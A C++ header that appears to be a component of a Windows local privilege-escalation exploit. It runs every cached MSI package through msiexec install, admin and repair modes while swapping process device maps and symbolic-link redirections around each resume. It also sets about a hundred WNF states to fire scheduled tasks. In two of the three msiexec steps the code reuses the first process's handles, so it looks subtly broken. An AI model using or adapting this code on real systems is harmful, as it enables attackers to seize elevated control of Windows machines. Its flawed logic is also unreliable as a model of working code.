#pragma once

void loadAllMsi( bool doPause , x::symlink_switch& switcher )
{
   for( auto& f : x::file{ "C:\\windows\\installer"_p }.enumDir() ) 
   {
       if (f.ends_with(L".msi"))
       {
           ULONG c;
            switcher.switch_base();
            auto p = x::process::execute(L"c:\\windows\\system32\\msiexec.exe", L"/qn /i c:\\windows\\installer\\"s + f,L"",true);

            x::process::SetProcessDeviceMap( x::objdir::open{ "\\??\\Global" }, p.process );
            switcher.switch_override();
            NtResumeThread(p.thread,&c);
            
            Sleep(10000);
           switcher.switch_base();
         auto   px = x::process::execute( L"c:\\windows\\system32\\msiexec.exe", L"/qn /a   c:\\windows\\installer\\"s + f,L"",true );
            x::process::SetProcessDeviceMap(x::objdir::open{ "\\??\\Global" }, p.process);
            switcher.switch_override();
           
            NtResumeThread(p.thread, &c); 

         Sleep(10000);
         switcher.switch_base();
            auto pi  =x::process::execute( L"c:\\windows\\system32\\msiexec.exe", L"/qn /fav c:\\windows\\installer\\"s + f ,L"",true);
            x::process::SetProcessDeviceMap(x::objdir::open{ "\\??\\Global" }, p.process);
            switcher.switch_override();
            NtResumeThread(p.thread, &c);

         
      }
   }
}
/*

void traverseTasks(x::file path) {

   for (auto& f : path.enumDir())
   {
      if (f.is_directory()) {
         try {
            traverseTasks(x::file{ f.path(), FILE_LIST_DIRECTORY });
         }
         catch (...) {}
      }
      else {
         try {
            std::cout << x::file{ f.path() ,FILE_SYNCHRONOUS_IO_NONALERT }.readdata() << std::endl;
         }
         catch (...) {}
      }
   }
}
*/
void wnftasks() {

   std::vector<std::wstring> allWNFTriggerableTasks = { L"0x418B0223A3BC1075",L"0x13920028A3BC8875",L"0x13920028A3BCE075",L"0x4183182BA3BC6875",L"0x4183182BA3BC4075",L"0x41850923A3BC1075",L"0x41850923A3BC3075",L"0x0A8E0D2CA3BC0875",L"0x41850923A3BC0875",L"0x41850923A3BC2075",L"0x0D83063EA3BCC075",L"0x0D891E2AA3BC10F5",L"0x0D891E2AA3BC0875",L"0x0A950729A3BC0875",L"0x0D83063EA3BD2075",L"0x0D83063EA3BD2875",L"0x0295013AA3BC1875",L"0x02951A3FA3BC0875",L"0x41877C2CA3BC0875",L"0x0D83063EA3BD2075",L"0x41840B3EA3BC4075",L"0x0D83063EA3BD6075",L"0x41950821A3BC3875",L"0x41960B29A3BC0C75",L"0x0D83063EA3BC2475",L"0x41850721A3BC4875",L"0x0D891E2AA3BC0875",L"0x0D83063EA3BE4075",L"0x0D83063EA3BCF875",L"0x41850721A3BC2075",L"0x41840B3EA3BC4075",L"0x0D83063EA3BCF875",L"0x0C951B29A3BC0875",L"0x41960A28A3BC0835",L"0x13920028A3BE0875",L"0x0D891E2AA3BC0875",L"0x41960A28A3BC3875",L"0x0295013AA3BC2075",L"0x41960A28A3BC6075",L"0x41C61629A3BC8075",L"0x41C61629A3BC8875",L"0x4183182BA3BC4875",L"0x0D83063EA3BC2475",L"0x0D83063EA3BD3875",L"0x0D83063EA3BC1875",L"0x41840B3EA3BC1075",L"0x41950821A3BC0875",L"0x41950821A3BC4875",L"0x418A0B39A3BE1875",L"0x0295013AA3BC0875",L"0x0D83063EA3BDF875",L"0x0D891E2AA3BC0875",L"0x0295013AA3BC3875",L"0x41950C3EA3BC0875",L"0x41870223A3BC1875",L"0x0D891E2AA3BC0875",L"0x0296003DA3BC0875",L"0x41930A28A3BC0875",L"0x41960B29A3BC0C75",L"0x0F87193AA3BC1875",L"0x41940A3FA3BC0875",L"0x09851E3EA3BC1075",L"0x4195083AA3BC0875",L"0x41901C3EA3BC1075",L"0x02871E3EA3BC0875",L"0x0D941D2BA3BC0875",L"0x02871E3EA3BC1075",L"0x0D83063EA3BC2475",L"0x41840B3EA3BC0875",L"0x41840B3EA3BC1075",L"0x0D83063EA3BC1875",L"0x41841D38A3BC3075",L"0x41841D38A3BC1075",L"0x41841D38A3BC1875",L"0x41841D38A3BC2875",L"0x41950F25A3BC0875",L"0x418B1E39A3BC1875",L"0x028F0222A3BC6075",L"0x418B1E39A3BC1075",L"0x0D8E1D2EA3BC2835",L"0x0880073AA3BC7875",L"0x41940B3AA3BC1075",L"0x41840B3EA3BC1075",L"0x0C960C38A3BC0875",L"0x1589012FA3BC1075",L"0x0D83063EA3BC2475",L"0x41960B29A3BC0C75",L"0x028F0222A3BC5075",L"0x41C6072EA3BC0875",L"0x0295013AA3BC1075",L"0x0C960C38A3BC0875",L"0x41891D38A3BC1075",L"0x41800329A3BC2075",L"0x4183182BA3BC1875",L"0x4183182BA3BC2875",L"0x12820D3AA3BC0875",L"0x0F87193AA3BC2075",L"0x41820F2CA3BC1075" };

   for (auto& a : allWNFTriggerableTasks)
   {
      try {
         x::wnfState(a).setStateData({ 0xff });
      }
      catch (...) {}
   }
}





template< typename T >
auto reverse(std::string& input) {
   std::stringstream ss;
   for (auto i = input.length() - 1; i > 1; i = i - 2)
   {
      ss << input.at(i - 1);
      ss << input.at(i);

   }
   ss << input.at(0) << input.at(1);
   return ss.str();
}
auto trim(std::string& str)
{
   if (str.empty())
      return ""s;

   const auto pStr = str.c_str();

   size_t front = 0;
   while (front < str.length() && std::isspace(int(pStr[front]))) { ++front; }

   size_t back = str.length();
   while (back > front&& std::isspace(int(pStr[back - 1]))) { --back; }

   if (0 == front)
   {
      if (back < str.length())
      {
         str.resize(back - front);
      }
   }
   else if (back <= front)
   {
      str.clear();
   }
   else
   {
      str = std::move(std::string(str.begin() + front, str.begin() + back));
   }
   return str;
}